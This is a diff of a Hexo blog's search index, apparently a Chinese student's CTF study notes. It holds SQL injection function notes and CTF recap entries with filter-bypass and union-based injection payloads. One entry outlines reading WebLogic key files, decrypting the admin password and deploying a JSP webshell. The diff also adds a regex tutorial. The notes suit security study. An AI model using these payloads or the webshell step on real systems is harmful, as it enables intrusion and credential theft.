class="line">该函数用于获得某个字符串最开始的字符的ASCII值。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>ascii()</span><br><span class="line"></span><br><span class="line">目前未发现与ord的不同。不过这样也有很大好处，那就是，如果<span class="keyword">SQL</span>注入的题目中过滤了<span class="keyword">or</span>，ord函数会躺枪，可以用ascii函数替代。</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> limit <span class="keyword">offset</span> 分页查询需要</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>concat()</span><br><span class="line"></span><br><span class="line">可以将多个字符串连接起来，参数个数无限。但是需要注意的地方就是，如果有一个参数的值是<span class="keyword">NULL</span>，那么整行结果就会返回一个<span class="keyword">NULL</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>group_concat()</span><br><span class="line"></span><br><span class="line">该函数可以将查询结果连成一行，如果只查询一列，默认用逗号分隔；如果查询多列，每一行的查询结果会直接进行字符串连接，行之间默认用逗号分隔。需要注意的是，用于分隔的默认字符可以修改。</span><br><span class="line"><span class="keyword">select</span> group_concat(username,password)<span class="keyword">result</span> <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>updatexml()</span><br><span class="line"></span><br><span class="line">这个主要是填写错误的xpath参数使查询报错，报错时会把xpath位置的查询结果暴露出来。如果关了回显的话就不要用这个了，可以考虑时间注入。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">第二个参数由于不符合xpath的规范，会报错。报错的时候会把version()执行的结果报出来，假设查询了flag，错误回显中会出现flag。</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span><span class="keyword">left</span>()</span><br><span class="line"></span><br><span class="line">该函数是一个字符串处理函数，用法实例:</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;2019&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">返回的结果为：<span class="number">20</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span><span class="keyword">right</span>()</span><br><span class="line"></span><br><span class="line">这个和<span class="keyword">left</span>对比着记，用法实例：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">right</span>(<span class="string">&#x27;2022&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">返回的结果为：<span class="number">22</span>。</span><br><span class="line"></span><br><span class="line">很明显，substr完全可以取代<span class="keyword">left</span>和<span class="keyword">right</span>两个函数，但是如果substr和mid被禁了，<span class="keyword">left</span>和<span class="keyword">right</span>就可以结合着用。</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span>elt()函数</span><br><span class="line"></span><br><span class="line">elt(n,str1,str2,str3);</span><br><span class="line"></span><br><span class="line">该函数的作用是，返回参数中的第n个字符串,参数可以是字符串常量或者列名。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> elt(<span class="number">2</span>，<span class="string">&#x27;888&#x27;</span>,<span class="string">&#x27;666&#x27;</span>);</span><br><span class="line">其返回的结果是<span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="number">13.</span>sleep()</span><br><span class="line"></span><br><span class="line">该函数的参数是一个整数t，可以在执行某操作后延迟t秒而不进行任何操作。该函数常用于处理没有回显的<span class="keyword">SQL</span>注入，根据响应的时间来确定被注入的<span class="keyword">SQL</span>语句是否执行成功了。</span><br><span class="line"></span><br><span class="line"><span class="number">14.</span>length()</span><br><span class="line"></span><br><span class="line">该函数的参数可以是字符串，或者列名。该函数的作用是获取字符串的长度。比如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> length(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">15.</span>rand()</span><br><span class="line"></span><br><span class="line">该函数用于产生一个随机数，可以接受一个参数作为种子，也可以直接使用。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="number">16.</span><span class="built_in">floor</span>()</span><br><span class="line"></span><br><span class="line">该函数用于将一个浮点数向下取整得到整数，可以与rand函数配合使用。在特定情况下，rand、floor、<span class="built_in">count</span>(<span class="operator">*</span>)配合<span class="keyword">group</span> <span class="keyword">by</span>可以进行报错注入。</span><br><span class="line"></span><br><span class="line"><span class="number">17.</span><span class="built_in">exp</span>()</span><br><span class="line"></span><br><span class="line">这是一个数学函数，可以求e的多少次幂，当参数过大时会因为溢出<span class="number">2</span>而报错。使用该函数时，通常将查询结果取反以便得到一个非常大的数。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="number">18.</span>hex()</span><br><span class="line"></span><br><span class="line">这个函数主要用于获取字符串对应的十六进制值。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> hex(<span class="string">&#x27;users&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">19.</span><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>是mysql中对查询数据进行排序的方法，后面可以跟列名或者列号（数字），两种写法等价。在<span class="keyword">sql</span>注入中，该关键字经常被用来测试一个表中有多少列，</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username; </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2222,7 +2222,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#x69;&#107;&#x61;&#101;&#x6b;&#107;&#107;&#x40;&#x64;&#105;&#110;&#x67;&#116;&#97;&#108;&#x6b;&#46;&#99;&#111;&#x6d;">&#x69;&#107;&#x61;&#101;&#x6b;&#107;&#107;&#x40;&#x64;&#105;&#110;&#x67;&#116;&#97;&#108;&#x6b;&#46;&#99;&#111;&#x6d;</a></p>
+<p>邮箱： <a href="mailto:&#x69;&#107;&#97;&#101;&#107;&#107;&#x6b;&#64;&#x64;&#105;&#110;&#x67;&#116;&#x61;&#x6c;&#107;&#46;&#99;&#111;&#x6d;">&#x69;&#107;&#97;&#101;&#107;&#107;&#x6b;&#64;&#x64;&#105;&#110;&#x67;&#116;&#x61;&#x6c;&#107;&#46;&#99;&#111;&#x6d;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -2280,37 +2280,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初夏赛复盘</title>
-    <url>/posts/63fc7f18/</url>
-    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
-<p>过滤绕过</p>
-</blockquote>
-<p>|| 代替 or</p>
-<p>!(a&lt;&gt;a) 代替 =</p>
-<p>/**/ 代替 空格</p>
-<p>mid 代替 left right substr</p>
-<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
-<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
-<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
-<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
-<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
-<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
-<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
-<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
-</code></pre>
-<p>jphide:</p>
-<p>这个有GUI界面不用命令输入密码就行。</p>
-<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>sql注入</tag>
-        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -2392,35 +2361,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>国庆赛部分赛题复现</title>
-    <url>/posts/bfdb9200/</url>
-    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
-<p>环境有点问题，复现一半出不来了</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
-<p>先通过任意文件读取漏洞获得密钥和密文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
-
-<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
-<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
-<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
-<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
-<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件上传总结</title>
     <url>/posts/ea42f6a6/</url>
     <content><![CDATA[<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><ol>
@@ -2497,6 +2437,66 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>web</tag>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初夏赛复盘</title>
+    <url>/posts/63fc7f18/</url>
+    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
+<p>过滤绕过</p>
+</blockquote>
+<p>|| 代替 or</p>
+<p>!(a&lt;&gt;a) 代替 =</p>
+<p>/**/ 代替 空格</p>
+<p>mid 代替 left right substr</p>
+<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
+<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
+<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
+<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
+<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
+<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
+</code></pre>
+<p>jphide:</p>
+<p>这个有GUI界面不用命令输入密码就行。</p>
+<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>国庆赛部分赛题复现</title>
+    <url>/posts/bfdb9200/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2619,6 +2619,455 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </categories>
       <tags>
         <tag>蓝桥杯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/posts/2f57a694/</url>
+    <content><![CDATA[<blockquote>
+<p>先把别人的down下来慢慢看</p>
+</blockquote>
+<p align="center">
+    <br/>
+    <a href="https://github.com/ziishaned/learn-regex">
+        <img src="https://i.imgur.com/bYwl7Vf.png" alt="Learn Regex">
+    </a>
+</p>
+
+<h2 id="什么是正则表达式？"><a href="#什么是正则表达式？" class="headerlink" title="什么是正则表达式？"></a>什么是正则表达式？</h2><blockquote>
+<p>正则表达式是一组由字母和符号组成的特殊文本，它可以用来从文本中找出满足你想要的格式的句子。</p>
+</blockquote>
+<p>一个正则表达式是一种从左到右匹配主体字符串的模式。<br>“Regular expression”这个词比较拗口，我们常使用缩写的术语“regex”或“regexp”。<br>正则表达式可以从一个基础字符串中根据一定的匹配模式替换文本中的字符串、验证表单、提取字符串等等。</p>
+<p>想象你正在写一个应用，然后你想设定一个用户命名的规则，让用户名包含字符、数字、下划线和连字符，以及限制字符的个数，好让名字看起来没那么丑。<br>我们使用以下正则表达式来验证一个用户名：</p>
+<p><br/><br/></p>
+<p align="center">
+  <img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/202202091606182.png" alt="Regular expression">
+</p>
+
+<p>以上的正则表达式可以接受 <code>john_doe</code>、<code>jo-hn_doe</code>、<code>john12_as</code>。<br>但不匹配<code>Jo</code>，因为它包含了大写的字母而且太短了。</p>
+<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul>
+<li><a href="#1-%E5%9F%BA%E6%9C%AC%E5%8C%B9%E9%85%8D">1. 基本匹配</a></li>
+<li><a href="#2-%E5%85%83%E5%AD%97%E7%AC%A6">2. 元字符</a><ul>
+<li><a href="#21-%E7%82%B9%E8%BF%90%E7%AE%97%E7%AC%A6-">2.1 点运算符 .</a></li>
+<li><a href="#22-%E5%AD%97%E7%AC%A6%E9%9B%86">2.2 字符集</a><ul>
+<li><a href="#221-%E5%90%A6%E5%AE%9A%E5%AD%97%E7%AC%A6%E9%9B%86">2.2.1 否定字符集</a></li>
+</ul>
+</li>
+<li><a href="#23-%E9%87%8D%E5%A4%8D%E6%AC%A1%E6%95%B0">2.3 重复次数</a><ul>
+<li><a href="#231--%E5%8F%B7">2.3.1 * 号</a></li>
+<li><a href="#232--%E5%8F%B7">2.3.2 + 号</a></li>
+<li><a href="#233--%E5%8F%B7">2.3.3 ? 号</a></li>
+</ul>
+</li>
+<li><a href="#24--%E5%8F%B7">2.4 {} 号</a></li>
+<li><a href="#25--%E7%89%B9%E5%BE%81%E6%A0%87%E7%BE%A4">2.5 (…) 特征标群</a></li>
+<li><a href="#26--%E6%88%96%E8%BF%90%E7%AE%97%E7%AC%A6">2.6 | 或运算符</a></li>
+<li><a href="#27-%E8%BD%AC%E7%A0%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6">2.7 转码特殊字符</a></li>
+<li><a href="#28-%E9%94%9A%E7%82%B9">2.8 锚点</a><ul>
+<li><a href="#281--%E5%8F%B7">2.8.1 ^ 号</a></li>
+<li><a href="#282--%E5%8F%B7">2.8.2 $ 号</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#3-%E7%AE%80%E5%86%99%E5%AD%97%E7%AC%A6%E9%9B%86">3. 简写字符集</a></li>
+<li><a href="#4-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E6%96%AD%E8%A8%80%E5%89%8D%E5%90%8E%E9%A2%84%E6%9F%A5">4. 零宽度断言(前后预查)</a><ul>
+<li><a href="#41--%E6%AD%A3%E5%85%88%E8%A1%8C%E6%96%AD%E8%A8%80">4.1 ?=… 正先行断言</a></li>
+<li><a href="#42--%E8%B4%9F%E5%85%88%E8%A1%8C%E6%96%AD%E8%A8%80">4.2 ?!… 负先行断言</a></li>
+<li><a href="#43---%E6%AD%A3%E5%90%8E%E5%8F%91%E6%96%AD%E8%A8%80">4.3 ?&lt;= … 正后发断言</a></li>
+<li><a href="#44--%E8%B4%9F%E5%90%8E%E5%8F%91%E6%96%AD%E8%A8%80">4.4 ?&lt;!… 负后发断言</a></li>
+</ul>
+</li>
+<li><a href="#5-%E6%A0%87%E5%BF%97">5. 标志</a><ul>
+<li><a href="#51-%E5%BF%BD%E7%95%A5%E5%A4%A7%E5%B0%8F%E5%86%99-case-insensitive">5.1 忽略大小写（Case Insensitive）</a></li>
+<li><a href="#52-%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2-global-search">5.2 全局搜索（Global search）</a></li>
+<li><a href="#53-%E5%A4%9A%E8%A1%8C%E4%BF%AE%E9%A5%B0%E7%AC%A6-multiline">5.3 多行修饰符（Multiline）</a></li>
+</ul>
+</li>
+<li><a href="#%E9%A2%9D%E5%A4%96%E8%A1%A5%E5%85%85">额外补充</a></li>
+<li><a href="#%E8%B4%A1%E7%8C%AE">贡献</a></li>
+<li><a href="#%E8%AE%B8%E5%8F%AF%E8%AF%81">许可证</a></li>
+</ul>
+<h2 id="1-基本匹配"><a href="#1-基本匹配" class="headerlink" title="1. 基本匹配"></a>1. 基本匹配</h2><p>正则表达式其实就是在执行搜索时的格式，它由一些字母和数字组合而成。<br>例如：一个正则表达式 <code>the</code>，它表示一个规则：由字母<code>t</code>开始，接着是<code>h</code>，再接着是<code>e</code>。</p>
+<pre>
+"the" => The fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.
+</pre>
+
+<p><a href="https://regex101.com/r/dmRygT/1">在线练习</a></p>
+<p>正则表达式<code>123</code>匹配字符串<code>123</code>。它逐个字符的与输入的正则表达式做比较。</p>
+<p>正则表达式是大小写敏感的，所以<code>The</code>不会匹配<code>the</code>。</p>
+<pre>
+"The" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.
+</pre>
+
+<p><a href="https://regex101.com/r/1paXsy/1">在线练习</a></p>
+<h2 id="2-元字符"><a href="#2-元字符" class="headerlink" title="2. 元字符"></a>2. 元字符</h2><p>正则表达式主要依赖于元字符。<br>元字符不代表他们本身的字面意思，他们都有特殊的含义。一些元字符写在方括号中的时候有一些特殊的意思。以下是一些元字符的介绍：</p>
+<table>
+<thead>
+<tr>
+<th align="center">元字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">.</td>
+<td>句号匹配任意单个字符除了换行符。</td>
+</tr>
+<tr>
+<td align="center">[ ]</td>
+<td>字符种类。匹配方括号内的任意字符。</td>
+</tr>
+<tr>
+<td align="center">[^ ]</td>
+<td>否定的字符种类。匹配除了方括号里的任意字符</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td>匹配&gt;=0个重复的在*号之前的字符。</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td>匹配&gt;=1个重复的+号前的字符。</td>
+</tr>
+<tr>
+<td align="center">?</td>
+<td>标记?之前的字符为可选.</td>
+</tr>
+<tr>
+<td align="center">{n,m}</td>
+<td>匹配num个大括号之前的字符或字符集 (n &lt;= num &lt;= m).</td>
+</tr>
+<tr>
+<td align="center">(xyz)</td>
+<td>字符集，匹配与 xyz 完全相等的字符串.</td>
+</tr>
+<tr>
+<td align="center">&#124;</td>
+<td>或运算符，匹配符号前或后的字符.</td>
+</tr>
+<tr>
+<td align="center">&#92;</td>
+<td>转义字符,用于匹配一些保留的字符 <code>[ ] ( ) &#123; &#125; . * + ? ^ $ \ &#124;</code></td>
+</tr>
+<tr>
+<td align="center">^</td>
+<td>从开始行开始匹配.</td>
+</tr>
+<tr>
+<td align="center">$</td>
+<td>从末端开始匹配.</td>
+</tr>
+</tbody></table>
+<h2 id="2-1-点运算符"><a href="#2-1-点运算符" class="headerlink" title="2.1 点运算符 ."></a>2.1 点运算符 <code>.</code></h2><p><code>.</code>是元字符中最简单的例子。<br><code>.</code>匹配任意单个字符，但不匹配换行符。<br>例如，表达式<code>.ar</code>匹配一个任意字符后面跟着是<code>a</code>和<code>r</code>的字符串。</p>
+<pre>
+".ar" => The <a href="#learn-regex"><strong>car</strong></a> <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.
+</pre>
+
+<p><a href="https://regex101.com/r/xc9GkU/1">在线练习</a></p>
+<h2 id="2-2-字符集"><a href="#2-2-字符集" class="headerlink" title="2.2 字符集"></a>2.2 字符集</h2><p>字符集也叫做字符类。<br>方括号用来指定一个字符集。<br>在方括号中使用连字符来指定字符集的范围。<br>在方括号中的字符集不关心顺序。<br>例如，表达式<code>[Tt]he</code> 匹配 <code>the</code> 和 <code>The</code>。</p>
+<pre>
+"[Tt]he" => <a href="#learn-regex"><strong>The</strong></a> car parked in <a href="#learn-regex"><strong>the</strong></a> garage.
+</pre>
+
+<p><a href="https://regex101.com/r/2ITLQ4/1">在线练习</a></p>
+<p>方括号的句号就表示句号。<br>表达式 <code>ar[.]</code> 匹配 <code>ar.</code>字符串</p>
+<pre>
+"ar[.]" => A garage is a good place to park a c<a href="#learn-regex"><strong>ar.</strong></a>
+</pre>
+
+<p><a href="https://regex101.com/r/wL3xtE/1">在线练习</a></p>
+<h3 id="2-2-1-否定字符集"><a href="#2-2-1-否定字符集" class="headerlink" title="2.2.1 否定字符集"></a>2.2.1 否定字符集</h3><p>一般来说 <code>^</code> 表示一个字符串的开头，但它用在一个方括号的开头的时候，它表示这个字符集是否定的。<br>例如，表达式<code>[^c]ar</code> 匹配一个后面跟着<code>ar</code>的除了<code>c</code>的任意字符。</p>
+<pre>
+"[^c]ar" => The car <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.
+</pre>
+
+<p><a href="https://regex101.com/r/nNNlq3/1">在线练习</a></p>
+<h2 id="2-3-重复次数"><a href="#2-3-重复次数" class="headerlink" title="2.3 重复次数"></a>2.3 重复次数</h2><p>后面跟着元字符 <code>+</code>，<code>*</code> or <code>?</code> 的，用来指定匹配子模式的次数。<br>这些元字符在不同的情况下有着不同的意思。</p>
+<h3 id="2-3-1-号"><a href="#2-3-1-号" class="headerlink" title="2.3.1 * 号"></a>2.3.1 <code>*</code> 号</h3><p><code>*</code>号匹配 在<code>*</code>之前的字符出现<code>大于等于0</code>次。<br>例如，表达式 <code>a*</code> 匹配0或更多个以a开头的字符。表达式<code>[a-z]*</code> 匹配一个行中所有以小写字母开头的字符串。</p>
+<pre>
+"[a-z]*" => T<a href="#learn-regex"><strong>he</strong></a> <a href="#learn-regex"><strong>car</strong></a> <a href="#learn-regex"><strong>parked</strong></a> <a href="#learn-regex"><strong>in</strong></a> <a href="#learn-regex"><strong>the</strong></a> <a href="#learn-regex"><strong>garage</strong></a> #21.
+</pre>
+
